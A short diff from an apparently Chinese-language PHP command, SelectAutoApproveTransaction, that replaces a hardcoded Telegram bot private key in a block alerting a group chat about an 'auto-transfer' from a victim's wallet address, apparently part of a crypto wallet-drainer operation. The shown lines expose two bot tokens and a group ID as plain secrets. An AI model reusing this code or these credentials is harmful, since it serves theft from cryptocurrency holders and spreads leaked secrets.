@@ -113,7 +113,7 @@ class SelectAutoApproveTransaction extends Command
 
                                 //TG通知开始
                                 $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n画：{$amount}";
-                                $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
+                                $key ='7676331067:AAHitQ3H8fQgjbpcOHZzcVB_fdjFTvntBOQ';//TG机器人私钥
                                 $id ='5725539445';//群组ID
                                 $u4 = $data_tg;
                                 $u4 = urlencode($u4);
